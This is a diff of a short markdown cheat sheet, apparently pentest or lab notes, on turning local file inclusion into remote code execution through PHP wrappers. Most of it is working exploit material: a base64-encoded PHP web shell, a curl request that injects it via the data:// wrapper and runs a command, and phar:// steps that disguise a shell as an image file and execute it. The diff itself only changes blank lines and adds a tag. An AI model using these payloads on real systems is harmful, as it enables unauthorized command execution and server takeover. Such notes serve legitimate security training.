@@ -1,4 +1,3 @@
-
 ##### Via LFI and PHP wrappers
 Encode PHP script in base64:
 ```bash
@@ -8,7 +7,7 @@ echo '<?php system($_REQUEST("cmd")) ?>' | base64
 ```shell
 curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
 ```
-i
+
 #### Data wrapper expect
 Check config for
 ```
@@ -41,3 +40,4 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 curl http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 ```
 
+[[php]]
